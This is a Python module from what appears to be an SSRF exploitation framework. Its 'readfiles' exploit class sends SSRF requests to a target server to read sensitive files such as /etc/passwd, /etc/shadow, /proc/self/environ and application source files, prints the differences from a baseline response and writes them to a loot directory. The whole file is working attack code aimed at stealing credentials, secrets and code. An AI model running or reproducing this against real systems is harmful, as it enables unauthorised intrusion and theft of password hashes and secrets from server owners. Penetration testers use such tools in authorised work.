import logging

from core.utils import *

name = "readfiles"
description = "Read files from the target"
author = "Swissky"
documentation = []


class exploit:
    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")
        if hasattr(args, "targetfiles") and isinstance(args.targetfiles, str):
            self.files = args.targetfiles.split(",")
        else:
            self.files = [
                "/etc/passwd",
                "/etc/lsb-release",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/passwd",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/proc/self/cwd/index.php",
                "/proc/self/cwd/application.py",
                "/proc/self/cwd/main.py",
                "/proc/self/exe",
            ]
        self.file_magic = {"elf": bytes([0x7F, 0x45, 0x4C, 0x46])}

        r = requester.do_request(args.param, "")

        if r is not None:
            default = r.text

            for remote_file in self.files:
                r = requester.do_request(args.param, wrapper_file(remote_file))
                diff = diff_text(r.text, default)
                if diff != "":
                    # Display diff between default and ssrf request
                    logging.info(f"\033[32mReading file\033[0m : {remote_file}")
                    if bytes(diff, encoding="utf-8").startswith(self.file_magic["elf"]):
                        logging.info("ELF binary found - not printing to stdout")
                    else:
                        logging.info(diff)

                    # Write diff to a file
                    output_path = loot_path(requester.host, remote_file)
                    logging.info(f"\033[32mWriting file\033[0m : {remote_file} to {output_path}")
                    output_path.write_text(diff, encoding="utf-8")

        else:
            logging.info("Empty response")
